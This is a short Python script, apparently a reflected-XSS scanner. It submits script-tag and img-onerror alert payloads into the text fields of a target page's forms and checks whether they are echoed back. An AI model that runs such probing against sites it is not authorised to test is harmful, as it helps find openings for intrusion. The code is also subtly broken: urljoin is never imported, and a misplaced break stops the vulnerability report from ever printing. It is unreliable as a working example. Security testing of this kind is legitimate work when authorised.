import requests
from bs4 import BeautifulSoup

target_url = 'http://example.com'
xss_payloads = ['<script>alert("XSS")</script>', '<img src=x onerror="alert(\'XSS\')">']

def xss_scanner(target_url, payloads):
    response = requests.get(target_url)
    parsed_html = BeautifulSoup(response.content, 'html.parser')
    forms = parsed_html.find_all('form')
    if forms:
        for form in forms:
            for payload in payloads:
                vulnerable = False
                data = {}
                for input_tag in form.find_all('input'):
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type', '').lower()
                    input_value = input_tag.get('value', '')

                    if input_type == 'text':
                        data[input_name] = payload
                    else:
                        data[input_name] = input_value

                try:
                    form_action = form.get('action')
                    form_method = form.get('method', 'get').lower()

                    if form_method == 'get':
                        r = requests.get(urljoin(target_url, form_action), params=data)
                    elif form_method == 'post':
                        r = requests.post(urljoin(target_url, form_action), data=data)

                    if payload in r.text:
                        vulnerable = True
                        break
                except requests.exceptions.RequestException:
                    pass

                if vulnerable:
                    print(f"Potential XSS vulnerability in form: {form}")

xss_scanner(target_url, xss_payloads)
